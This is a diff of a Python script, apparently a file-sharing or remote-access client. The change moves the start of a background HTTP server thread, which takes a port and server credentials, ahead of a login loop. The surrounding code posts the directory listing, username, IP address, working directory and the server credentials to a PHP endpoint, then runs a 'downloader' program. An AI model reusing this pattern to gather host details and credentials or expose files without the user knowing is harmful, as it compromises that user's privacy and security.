@@ -19,6 +19,11 @@ def downloader():
     com = "downloader"
     os.system(com)
 headers = {'content-type': 'application/json'}
+server_thread = threading.Thread(target=basichttpserver,args=(port,server_user,server_pass,))
+server_thread.setDaemon(True)
+#download_thread.start()
+
+server_thread.start()
 auth = 0
 attempts = 5
 while auth != 1 and attempts != 0:
@@ -45,12 +50,7 @@ while auth != 1 and attempts != 0:
         str_dir = str(dirs)
         response = requests.post("http://"+localhost+"/direcctorylist.php", data = {'list':str_dir,'username':username,'ipaddr':ipaddr,'location':os.getcwd(),'server_user':server_user,'server_pass':server_pass,'port':port})
         #downloader()
-        server_thread = threading.Thread(target=basichttpserver,args=(port,server_user,server_pass,))
-        server_thread.setDaemon(True)
-        #download_thread.start()
 
-        server_thread.start()
-        time.sleep(15)
         downloader()
         #downloader()
         #print("Response: \n")
